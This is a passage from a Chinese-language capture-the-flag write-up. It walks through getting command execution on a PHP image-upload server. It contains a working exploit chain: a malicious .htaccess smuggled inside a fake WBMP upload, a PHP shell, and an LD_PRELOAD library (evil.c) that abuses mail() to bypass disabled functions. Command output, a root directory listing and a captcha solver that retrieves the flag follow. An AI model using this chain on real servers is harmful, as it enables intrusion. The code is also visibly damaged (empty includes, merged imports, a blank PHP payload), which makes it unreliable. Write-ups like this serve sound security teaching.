## 找到命令执行方法
使用上面的python脚本，我们可以运行任意PHP代码。我们试了几个典型的shell函数，例如`system()`和`exec()`，但发现这些函数大部分被屏蔽了。调用`phpinfo()`得到以下列表：
在这种情况下，获取命令执行的已知办法是通过`mail()`函数。
PHP的`mail()`函数调用`execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "],
...)`。由于这种实现，如果我们使用自写动态库设置环境变量`LD_PRELOAD`，从而修改`/bin/sh`的行为并获得命令执行。[这里](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)阅读更多相关信息。
即使`/usr/sbin/sendmail`不存在，这办法也有用。我们可以用一个小的PHP脚本来证明：
    $ php index.php
    ERROR: ld.so: object 'garbage' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
    sh: 1: /usr/sbin/sendmail: not found
在自写库中，我们重写了`getuid()`函数：
    $ cat evil.c
    /* compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
    #include #include #include 
    void payload(char *cmd) {
      char buf[512];
      strcpy(buf, cmd);
      strcat(buf, " > /tmp/_0utput.txt");
      system(buf);}
    int getuid() {
      char *cmd;
      if (getenv("LD_PRELOAD") == NULL) { return 0; }
      unsetenv("LD_PRELOAD");
      if ((cmd = getenv("_evilcmd")) != NULL) {
        payload(cmd);
      }
      return 1;
    }
上面的代码将使用`_evilcmd`环境变量中指定的命令运行`system()`。输出将发送到`/tmp/_0utput.txt`。
这是新的python利用脚本（这里调用的命令是`uname -a`）：
    #!/usr/bin/env python3
    import requestsimport base64
    VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
    URL = "http://35.246.234.136/"
    RANDOM_DIRECTORY = "ad759ad95e5482e02a15c5d30042b588b6630e64"
    COOKIES = {
        "PHPSESSID" : "0e7eal0ji7seg6ac3ck7d2csd8"}
    def upload_content(name, content):
        data = {
            "image" : (name, content, 'image/png'),
            "upload" : (None, "Submit Query", None)
        }
        response = requests.post(URL, files=data, cookies=COOKIES)
    HT_ACCESS = VALID_WBMP + b"""
    AddType application/x-httpd-php .corb3nik
    php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.corb3nik"
    """
    TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
    """)
    upload_content("..htaccess", HT_ACCESS)
    upload_content("shell.corb3nik", TARGET_FILE)
    upload_content("trigger.corb3nik", VALID_WBMP)
    files = { "evil" : open("../payloads/evil.so", "rb") }
    response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.corb3nik", files=files)
    print(response.text)
    $ python solution.py # uname -a
    99
    Linux ab5411ade442 4.15.0-1026-gcp #27-Ubuntu SMP Thu Dec 6 18:27:01 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
    $ python solution.py # ls -lah /
    99
    total 104K
    drwxr-xr-x   1 root root 4.0K Jan 20 08:25 .
    drwxr-xr-x   1 root root 4.0K Jan 20 08:25 ..
    -rwxr-xr-x   1 root root    0 Jan 20 08:25 .dockerenv
    drwxr-xr-x   1 root root 4.0K Jan  9 15:45 bin
    drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
    drwxr-xr-x   5 root root  360 Jan 20 08:25 dev
    drwxr-xr-x   1 root root 4.0K Jan 20 08:25 etc
    -r--------   1 root root   38 Jan 10 15:10 flag
    -rwsr-xr-x   1 root root  17K Jan 10 15:10 get_flag
    drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
    drwxr-xr-x   1 root root 4.0K Nov 12 20:54 lib
    drwxr-xr-x   2 root root 4.0K Nov 12 20:55 lib64
    drwxr-xr-x   2 root root 4.0K Nov 12 20:54 media
    drwxr-xr-x   2 root root 4.0K Nov 12 20:54 mnt
    drwxr-xr-x   2 root root 4.0K Nov 12 20:54 opt
    dr-xr-xr-x 362 root root    0 Jan 20 08:25 proc
    drwx------   1 root root 4.0K Jan 20 09:58 root
    drwxr-xr-x   1 root root 4.0K Jan  9 15:46 run
    drwxr-xr-x   1 root root 4.0K Nov 19 21:20 sbin
    drwxr-xr-x   2 root root 4.0K Nov 12 20:54 srv
    dr-xr-xr-x  13 root root    0 Jan 19 20:39 sys
    d-wx-wx-wt   1 root root 4.0K Jan 20 21:28 tmp
    drwxr-xr-x   1 root root 4.0K Nov 12 20:54 usr
    drwxr-xr-x   1 root root 4.0K Jan  9 15:45 var
    $ python solution.py # /get_flag
    99
    Please solve this little captcha:
    2887032228 + 1469594144 + 3578950936 + 3003925186 + 985175264
    11924677758 != 0 :(
就要出来了！貌似解开这个验证码就能拿到flag。
## 解验证码
为了获得flag，我们需要求解可执行文件`/get_flag`给出的等式。
`/get_flag`文件要求用户在不到一秒的时间内输入，因此我们需要一个自动化解算器。
运行几次后我发现这个等式只是在做加法。
我决定用C来写求解器：
    $ cat captcha_solver.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main() {
            pid_t pid = 0;
            int inpipefd[2];
            int outpipefd[2];
            pipe(inpipefd);
            pipe(outpipefd);
            pid = fork();
            if (pid == 0) {
                    dup2(outpipefd[0], STDIN_FILENO);
                    dup2(inpipefd[1], STDOUT_FILENO);
                    dup2(inpipefd[1], STDERR_FILENO);
                    prctl(PR_SET_PDEATHSIG, SIGTERM);
                    execl("/get_flag", "get_flag", (char*) NULL);
                    exit(1);
            }
            close(outpipefd[0]);
            close(inpipefd[1]);
            char data[0xff] = {0};
            // Read first line
            for (; data[0] != '\n'; read(inpipefd[0], data, 1));
            // Read captcha
            read(inpipefd[0], data, 0xff);
            uint64_t sum = 0;
            char *pch;
            printf("Raw : %s\n", data);
            pch = strtok (data, "+");
            printf("Sum : %lu\n", sum);
            while (pch != 0)  {
                    sum += strtoull(pch, 0, 10);
                    printf("Operand : %lu\n", atol(pch));
                    printf("Sum : %lu\n", sum);
                    pch = strtok (0, "+");
            }
            char result[32] = {0};
            sprintf(result, "%lu\n", sum);
            printf("Result : %lu\n", sum);
            write(outpipefd[1], result, 16);
            memset(data, 0, 0xff);
            read(inpipefd[0], data, 0xff);
            printf("Final : %s", data);
     }
上面的代码首先上启动`/get_flag`，获取等式，用`+`作为分隔符将其拆分，对每个部分求和，再将结果发回二进制文件并打印flag。
最后的PHP代码：
... 最终结果：
    $ python solution.py
    99
    Raw : 4185107874 + 1348303100 + 4161955080 + 4235948880 + 3410743011
    Sum : 0
    Operand : 4185107874
    Sum : 4185107874
    Operand : 1348303100
    Sum : 5533410974
    Operand : 4161955080
    Sum : 9695366054
    Operand : 4235948880
    Sum : 13931314934
    Operand : 3410743011
    Sum : 17342057945
    Result : 17342057945
    Final : INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}
Flag : INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}